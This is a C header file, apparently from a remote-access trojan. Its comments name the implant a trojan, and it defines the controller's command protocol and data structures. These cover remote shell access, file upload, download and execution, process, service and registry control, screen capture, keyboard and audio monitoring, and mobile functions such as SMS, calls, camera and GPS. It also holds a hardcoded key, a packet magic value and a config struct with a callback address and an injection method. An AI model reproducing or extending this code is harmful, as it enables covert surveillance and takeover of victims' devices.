#ifndef MARCO_H
#define MARCO_H

#include <stdarg.h>
#include <windows.h>

////////////命令字ID////////////

//反响连接的确认（由监控端发送给被监控端）
#define CONTROL_FEEDBACK		0x00ef				

//获取目标插件
#define CONTROL_GET_PLUGIN		0x00f0				

//更新目标插件
#define CONTROL_UPDATE			0x00f1				

//卸载目标插件
#define CONTROL_UNINSTALL		0x00f2			

//保持连接KeepAlive
#define CONTROL_KEEPALIVE		0x00f3			

//请求目标计算机的基本信息
#define CONTROL_QUERY_INFO		0x00f4

//重启目标机器
#define CONTROL_RESTART_SYSTEM	0x00f5

//关闭目标机器
#define CONTROL_SHUTDOWN_SYSTEM	0x00f6				

//登陆机器，发送用户名
#define CONTROL_LOGIN			0x00f7	

//卸载自身
#define CONTROL_REMOVE			0x00f8	

//卸载自身
#define CONTROL_CHANGE_TEXT		0x00f9	

//请求目标计算机的shell
#define CONTROL_REQUEST_SHELL	0x0101

//列出所有驱动器
#define CONTROL_ENUM_DISKS		0x0201				

//列出目录
#define CONTROL_ENUM_FILES		0x0202				

//重命名文件/目录
#define CONTROL_RENAME_FILE		0x0203				

//删除文件/目录
#define CONTROL_DELETE_FILE		0x0204				

//运行文件
#define CONTROL_RUN_FILE		0x0205				

//上传文件/目录
#define CONTROL_UPLOAD_FILE		0x0206				

//下载文件/目录
#define CONTROL_DOWNLOAD_FILE	0x0207				

//拷贝文件/目录
#define CONTROL_COPY_FILE		0x0208		

//搜索文件/目录
#define CONTROL_SEARCH_FILE		0x0209	

//创建目录
#define CONTROL_CREATE_DIR		0x020a	

//改变当前目录
#define CONTROL_CHANGE_DIR		0x020b

//文件信息
#define CONTROL_INFO_FILE		0x020c	

//结束文件目录传递
#define CONTROL_END_TRANSFER	0x020d


//进程管理
#define CONTROL_ENUM_PROCS		0x0301				

//杀死进程
#define CONTROL_KILL_PROCS		0x0302				


//服务管理
#define CONTROL_ENUM_SVCS		0x0401				
			
//启动服务
#define CONTROL_START_SVCS		0x0402				

//暂停服务
#define CONTROL_PAUSE_SVCS		0x0403				

//停止服务
#define CONTROL_STOP_SVCS		0x0404				

//重启服务
#define CONTROL_RESTART_SVCS	0x0405				

//修改服务
#define CONTROL_MODIFY_SVCS		0x0406				


//查询指定键值
#define CONTROL_REG_QUERY		0x0501				

//删除子键
#define CONTROL_REG_DELETE_K	0x0502				

//更改键值名
#define CONTROL_REG_RENAME_V	0x0503			

//删除键值
#define CONTROL_REG_DELETE_V	0x0504				

//更改键值
#define CONTROL_REG_EDIT_V		0x0505				

//新建键值
#define CONTROL_REG_CREATE_V	0x0506			

//屏幕监控
#define CONTROL_MONITOR_SCREEN	0x0601			

//屏幕信息
#define CONTROL_INFO_SCREEN		0x0602			

//第一帧屏幕
#define CONTROL_FIRST_SCREEN	0x0603			

//后续帧屏幕
#define CONTROL_NEXT_SCREEN		0x0604			

//关闭屏幕监控
#define CONTROL_CLOSE_SCREEN	0x0605		

//键盘监控
#define CONTROL_MONITOR_KEY		0x0701	

//声音监控
#define CONTROL_AUDIO_INIT		0x0801	

//声音数据
#define CONTROL_AUDIO_DATA		0x0802	

//关闭声音监控
#define CONTROL_AUDIO_CLOSE		0x0803	

//查询联系人
#define CONTROL_QUERY_CONTACTS	0x0901

//发送短消息
#define CONTROL_SEND_MESSAGE	0x0902

//打电话
#define CONTROL_DIAL_NUMBER		0x0903

//摄像头拍照
#define CONTROL_CAMERA			0x0904

//GPS定位
#define CONTROL_GPS				0x0905

//发送Email
#define CONTROL_SEND_EMAIL		0x906

//网页浏览
#define CONTROL_BROWSER			0x907


////////////错误代码////////////

//尚且不支持该模块
#define ERR_NOTHISMODULE		0x0001

//访问权限不够
#define ERR_DENIED				0x0002

//文件已经存在
#define ERR_EXIST				0x0003

//文件不存在
#define ERR_NOTFIND				0x0004

//无效参数
#define ERR_INVPARA				0x0005

//超时
#define ERR_TIMEOUT				0x0006

//取磁盘信息失败
#define ERR_FAILGETDISK			0x0007

//路径不存在
#define ERR_NOPATH				0x0008

//连接失败
#define ERR_FAILCONN			0x0009

//创建工作失败
#define ERR_FAILJOB				0x000f

//未知错误
#define ERR_UNKNOWN				0xffff


////////////操作系统列表////////////

//未定义
#define OS_NOTDEFINED			0x00

//WINDOWS
#define OS_WINDOWS				0x01

//Linux
#define OS_LINUX				0x02

//MAC OS
#define OS_MACOS				0x03

//Android
#define OS_ANDROID				0x04

//Windows Phone
#define OS_WINDOWS_PHONE		0x05

//Windows MOBILE
#define OS_WINDOWS_MOBILE		0x06

//IPhone
#define OS_IPHONE				0x07


//////////////////////////////////////////////////////////////////////////

#define MAGIC_ID "Win7"

struct control_header
{
	char magic[6];						//标识
	
	unsigned short isCompressed:2;		//压缩标志
	unsigned short reserved:14;
	
	unsigned char password[16];			//密码或者为GUID
	
	unsigned short seq;					//序号（如果存在多个数据包，则序号从1开始，否则序号为0。
										//判断多个序列数据包结束看dataLen是否为-1）
	unsigned short timestamp;			//时间戳，用来验证数据的
	
	unsigned short command;				//命令标识字
	unsigned short response;			//响应状态
	
	int dataLen;						//数据正文长度
};

#define FILL_MAGIC(package)		(strncpy((package).magic, MAGIC_ID, strlen(MAGIC_ID)))
#define ISVALID_HEADER(package)	(strncmp((package).magic, MAGIC_ID, strlen(MAGIC_ID)) == 0)
#define IS_PACKAGE_END(package)	((package).seq == 0 || ((package).dataLen == -1))

#define INITIALIZE_HEADER(cmd)  \
	{MAGIC_ID, 0, 0, "", 0, time(NULL)&0xffff, cmd, 0}

#define INITIALIZE_ENCYRPT_HEADER(cmd)  \
{MAGIC_ID, 1, 0, "", 0, time(NULL)&0xffff, cmd, 0}

#define INITIALIZE_COMPRESS_HEADER(cmd)  \
{MAGIC_ID, 2, 0, "", 0, time(NULL)&0xffff, cmd, 0}


#define REASSIGN_HEADER(package, cmd, status)  \
	(package).command = cmd; (package).response = status; (package).timestamp = time(NULL)&0xffff;


#define  myKey "Trimps2011"

//进程信息列表
struct process_info
{
	unsigned long id;
	char name[64];
};

//端口信息列表
struct port_info     
{
	unsigned long processId;	//Process ID
	unsigned long port;			//Listen Port
	unsigned long addr;		//Listen Address
};

struct network_info
{
	char name[64];
	char ip[16];
	char gateway[16];
	char mask[16];
};

//系统基本信息
struct system_info
{
	//操作系统信息
	union
	{
		struct
		{
			unsigned long majorVersion;
			unsigned long minorVersion;
			unsigned long platformId;
			unsigned long buildNumber;
			unsigned long productType;
		}windows;

		struct
		{
			unsigned long majorVersion;
			unsigned long minorVersion;
		}os;
	};
	
	unsigned long totalMemory;		//内存总数
	unsigned long availMemory;		//可用内存
	
	//CPU
	unsigned long cpuCount;			
	unsigned long cpuSpeed;
	char cpuDesc[64];

	//BIOS
	char biosDesc[32];
	
	//计算机名与用户名
	char computerName[64];
	char userName[64];
	char userGroupName[32];

	//系统目录和windows目录
	char sysDir[64];
	char winDir[32];

	int cntNW;
	struct network_info networks[0];
};


enum drive_type
{
	IS_UNKNOW,
	IS_REMOVABLE,
	IS_FIXED,
	IS_REMOTE,
	IS_CDROM,
	IS_RAM
};

enum drive_format
{
	FORMAT_UNKNOWN,
	FORMAT_NTFS,
	FORMAT_FAT32
};

//磁盘信息的结构
struct partition_info
{
	char			name[3];
	unsigned char	driveType:4;			//驱动器类型
	unsigned char	format:4;				// 格式: NTFS/FAT32
	unsigned long	lowTotalBytes;		// 总容量低位
	unsigned long	highTotalBytes;		// 总容量高位	
	unsigned long	lowFreeBytes;		// 可用容量低位
	unsigned long	highFreeBytes;		// 可用容量高位
};

enum file_type{
	IS_FILE,
	IS_DIR
};

//目录/文件信息
struct dir_info
{
	enum file_type		fileType;	// 文件类型
	char				name[256];	// 文件名

	// 最后一次修改时间
	unsigned long		lowDateTime;
	unsigned long		highDateTime;

	//文件大小
	unsigned long		fileSizeLow;
	unsigned long		fileSizeHigh;

};

union fileop_info
{
	char fileName[512];		//新建目录，列出目录,删除,上传/下载，运行（注意最后都不带\\）

	struct
	{
		char oldFile[256];	//原有文件
		char newFile[256];	//修改之后的文件
	}renameInfo;

	struct
	{
		char oldFile[256];
		char newFile[256];
	}copyInfo;

	struct 
	{
		char dir[256];
		char pattern[256];
	}searchInfo;

	struct{
		char clientFile[256];	//客户端的目标文件
		char trojanFile[256];	//木马端的目标文件
		void* event;
	}ftpInfo;

};

//木马服务器保持连接的数据格式
struct keepalive_info
{
	unsigned short cmd;
	unsigned short reserved;
};

typedef char string_ip[32];

//木马服务器的配置格式
union client_cfg
{
	struct
	{
		char magic[8];				//标记
		char clientIP[32];			//客户端IP或者域名
		unsigned int port;			//端口
		unsigned int conn_type;		//连接类型,TCP还是UDP
		char password[16];			//密码
		char inject[32];			//注入方式
		char cmdModules[256];		//所支持的dll命令模块，以|作为分隔符
		void* reserved;
	}cfg1;
	
	unsigned char cfg2[512];
};

#define CFG_MAGIC "\x12\x34\x56\x78\x9A\xBC\xDE\xF0"

#if !defined(_CONSOLE) && !defined(KDEBUG)
static inline void KDebug(const char *fmt, ...)
{
	char output[4096];

	memset(output, 0, sizeof(output));
	va_list args;
	va_start(args, fmt);
	int n = _vsnprintf(output, sizeof(output), fmt, args);
	va_end(args);

	if(output[n - 1] != '\n')
		output[n] = '\n';
	OutputDebugStringA(output);
}
#else
#define KDebug printf
#endif

#endif